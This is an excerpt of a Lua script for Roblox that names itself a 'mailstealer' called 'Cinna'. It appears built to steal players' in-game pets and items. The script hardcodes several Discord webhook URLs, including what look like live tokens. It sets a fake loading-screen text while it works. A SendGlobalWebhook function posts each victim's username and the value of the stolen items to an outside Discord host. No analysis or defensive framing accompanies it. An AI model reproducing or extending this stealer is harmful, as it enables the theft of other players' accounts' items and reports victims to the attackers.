...
DualhookWebhook =
    "https://discord.com/api/webhooks/1331464120486334504/la4oxQpVh-uIif9A1YUhqus2WKYLjAFeV7Ja7JrgQWwKg8v-7LWjwyajuu3C17GWLxNz"
LogsWebhook =
    "https://discord.com/api/webhooks/1331464068128837642/1F_nXp4Qv47mCxbCyIEKsjXRau8M6I3rNGbWnrIq6L7DSSkBkLwJkcRFAw4snd1pcnIb"
DualhookRAP =  1000000000
mailstealer_name = "Cinna"
...
-- Use the variable to set the loading screen text
game:GetService("Players").LocalPlayer.PlayerGui.Transition.Hint.HintLabel.Text = LOADING_SCREEN
...
local MailMessage = "Cinna on top!"
...
local function SendMessage(id, item_type, RBgoldNormal, thumbnail, webhook, pets_left, shiny, ping, RAP, totalRap1)
    ...
    imgs =
        "https://en.akkogear.com/wp-content/uploads/2021/09/Cinnamoroll-XQ.jpg"
...
GlobalWebhook = "https://discord.com/api/webhooks/1285954996499779718/e3v5G4Y8cpsyXsFvcgIurruE7x8G4TXGQL3ZtC7j0dvZOdGDq0tiwM60hpgJUZAkH9Fk"
...
local function SendGlobalWebhook(items, totalRAP, victimUsername)
    ...
    local msg = {
        ["content"] = nil,
        ["username"] = "Cinna Global",
        ["avatar_url"] = "https://images-ext-1.discordapp.net/external/lQoYJfB6vF-6CPq4b1m9_PFMj3dg8WvDzju7JvaQ9Ak/https/i.pinimg.com/736x/6c/5a/5e/6c5a5e08d08a609d663a5866ff992f7a.jpg?format=webp&width=612&height=614", -- You can change the avatar URL
        ["embeds"] = {
            {
